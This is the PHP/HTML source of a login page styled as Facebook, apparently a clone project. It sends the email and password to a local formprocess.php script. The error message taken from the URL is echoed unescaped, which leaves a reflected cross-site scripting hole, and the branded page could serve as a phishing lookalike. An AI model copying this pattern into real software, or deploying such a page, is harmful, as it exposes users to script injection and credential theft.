<?php require_once 'connection.php'?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="style.css" />
</head>
<body>
    <div class="container flex">
        <div class="facebook-page flex">
            <div class="text">
                <h1>facebook</h1>
                <p>Connect with friends and the world</p>
                <p>around you on Facebook.</p>
            </div>
            <form action="formprocess.php" method="POST">
                <input type="email" placeholder="Email or phone number" name="email" id="username" autocomplete="off"
                    maxlength="35" />
                <div class="pswd">
                    <input type="password" placeholder="Password" name="password" autocomplete="off" maxlength="25"
                        onkeyup="showHide()" id="password"/>
                    <div class="showHide" id="showPwd" onclick="hide(), Toggle()">
                        <img src="https://img.icons8.com/material-outlined/24/000000/visible--v1.png" alt="show" />
                    </div>
                    <div class="showHide" id="hidePwd" onclick="show(), Toggle()">
                        <img src="https://img.icons8.com/material-outlined/24/000000/hide.png" alt="hide" />
                    </div>
                </div>
                <!-- Display success message here -->
                <?php
session_start();

// Check if there is an error message
$errorMessage = isset($_GET['error']) ? $_GET['error'] : '';

// Display the error message
if ($errorMessage) {
    echo '<p style="color: red; font-size:10px; text-align:center; margin-bottom:5px;">' . $errorMessage . '</p>';
}
?>
                <div class="link">
                    <button type="submit" class="login">Login</button>
                    <a href="forget-password.php" class="forgot">Forgot password?</a>
                </div>
                <hr />
                <div class="button">
                    <a href="signup.php">Create new account</a>
                </div>
            </form>
        </div>
    </div>
<script src="script.js"></script>
</body>

</html>